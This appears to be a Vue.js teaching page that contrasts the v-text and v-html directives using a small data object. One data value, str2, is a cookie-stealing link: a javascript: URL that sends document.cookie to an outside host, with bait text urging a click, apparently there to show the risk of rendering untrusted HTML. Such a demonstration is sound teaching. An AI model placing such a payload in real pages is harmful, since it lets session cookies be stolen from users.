<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h2>hello {{name}}</h2>


    <!--    v-text-->
    <div v-text="name"></div>

    <div v-text="str"></div>
    <!--    v-html -->
    <div v-html="str"></div>


    <div v-html="str2"></div>

</div>


<script type="text/javascript">
    new Vue({
        el: '#root',
        data: {
            name: 'clxmm',
            str: '<h3>你好啊！</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        },
        methods: {}
    })
</script>

</body>
</html>
